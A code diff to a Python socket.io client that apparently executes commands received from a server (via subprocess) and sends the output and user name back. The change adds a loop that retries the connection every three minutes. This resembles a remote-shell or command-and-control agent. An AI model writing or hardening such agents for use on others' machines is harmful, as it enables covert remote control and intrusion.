@@ -1,6 +1,7 @@
 import subprocess
 import socketio
 import requests
+import time
 
 sio = socketio.Client()
 url = 'http://localhost:4000/'
@@ -35,6 +36,15 @@ def command(cmd):
     else:
         sio.emit('command', {'user': whoami, 'cmd': result.stdout.strip()})
 
-sio.connect(url)
 
+def connect_to_server():
+    while True:
+        try:
+            sio.connect(url)
+            break
+        except socketio.exceptions.ConnectionError as e:
+            print(f"Connection failed: {e}. Retrying in 3 minutes...")
+            time.sleep(180)
+
+connect_to_server()
 sio.wait()
